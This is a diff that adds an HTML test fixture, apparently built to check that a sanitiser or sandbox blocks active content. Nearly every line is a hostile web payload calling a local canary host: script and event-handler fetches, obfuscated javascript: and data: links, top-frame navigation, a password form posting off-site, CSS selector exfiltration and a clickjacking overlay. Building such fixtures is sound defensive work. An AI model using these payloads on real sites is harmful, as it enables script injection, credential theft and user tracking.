@@ -1,0 +1,41 @@
+<!doctype html>
+<html><head>
+<meta http-equiv="refresh" content="0;url=http://canary.localhost:9911/meta-refresh">
+<base href="http://canary.localhost:9911/base/" target="_self">
+<link rel="stylesheet" href="http://canary.localhost:9911/link-stylesheet.css">
+<link rel="dns-prefetch" href="http://canary.localhost:9911/">
+<title>Hostile title</title>
+<style>
+  @import url("http://canary.localhost:9911/css-import.css");
+  @font-face { font-family: X; src: url("http://canary.localhost:9911/css-font.woff"); }
+  body { background-image: url("http://canary.localhost:9911/css-url-body.png"); font-family: X; }
+  a[href^="https"] { background: url("http://canary.localhost:9911/css-exfil-selector.png"); }
+</style>
+<script>fetch("http://canary.localhost:9911/script-head"); parent.document.title = "PWNED by script";</script>
+</head>
+<body onload="fetch('http://canary.localhost:9911/body-onload')">
+<h1 id="hostile-marker">Hostile everything</h1>
+<p>Everything below tries to run code or reach the network. None of it should.</p>
+<script>fetch("http://canary.localhost:9911/script-body"); window.top.location = "http://canary.localhost:9911/top-nav";</script>
+<img src="x" onerror="fetch('http://canary.localhost:9911/img-onerror')">
+<img src="http://canary.localhost:9911/remote-image.png" alt="remote tracker">
+<img srcset="http://canary.localhost:9911/srcset.png 1x" alt="candidate list tracker">
+<svg width="10" height="10" onload="fetch('http://canary.localhost:9911/svg-onload')"><script>fetch("http://canary.localhost:9911/svg-script")</script><image href="http://canary.localhost:9911/svg-image.png"/></svg>
+<iframe src="http://canary.localhost:9911/inner-iframe"></iframe>
+<iframe srcdoc="<script>fetch('http://canary.localhost:9911/inner-srcdoc')</script>"></iframe>
+<object data="http://canary.localhost:9911/object"></object>
+<embed src="http://canary.localhost:9911/embed">
+<video src="http://canary.localhost:9911/video.mp4" autoplay></video>
+<audio src="http://canary.localhost:9911/audio.mp3" autoplay></audio>
+<form action="http://canary.localhost:9911/form-action" method="post"><input name="password" value="secret" autofocus onfocus="fetch('http://canary.localhost:9911/onfocus')"><button id="hostile-submit">Sign in</button></form>
+<p><a id="link-js" href="javascript:fetch('http://canary.localhost:9911/javascript-link')">javascript link</a></p>
+<p><a id="link-tabbed" href="java&#9;script:fetch('http://canary.localhost:9911/javascript-tabbed')">tabbed javascript link</a></p>
+<p><a id="link-data" href="data:text/html,<script>opener.document.title='PWNED by data'</script>">data link</a></p>
+<p><a id="link-self" href="http://canary.localhost:9911/link-self" target="_self">same frame link</a></p>
+<p><a id="link-top" href="http://canary.localhost:9911/link-top" target="_top" ping="http://canary.localhost:9911/ping">top link</a></p>
+<p><a id="link-ok" href="https://example.com/ok">an ordinary link</a></p>
+<div style="background:url('http://canary.localhost:9911/style-attribute.png');width:10px;height:10px"></div>
+<table background="http://canary.localhost:9911/table-background.png"><tr><td>table</td></tr></table>
+<div style="position:fixed;inset:0;background:transparent" id="overlay">overlay</div>
+<!-- <img src="http://canary.localhost:9911/comment.png"> -->
+</body></html>
